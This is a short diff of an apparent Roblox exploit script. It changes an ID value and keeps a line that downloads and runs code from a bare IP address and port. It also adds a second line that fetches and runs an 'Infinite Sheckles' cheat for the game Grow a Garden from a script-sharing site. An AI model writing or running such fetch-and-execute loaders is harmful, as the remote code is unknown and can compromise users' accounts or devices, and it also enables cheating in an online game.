@@ -1,3 +1,3 @@
-_G.LoadingScreen = true
-ID="5a318123-7ace-4a8d-8c46-c04f2003a108";
+ID="2b86c4da-5d78-4d26-85ff-979d24e92e28";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-Blackhub-Infinite-Sheckles-41369"))()
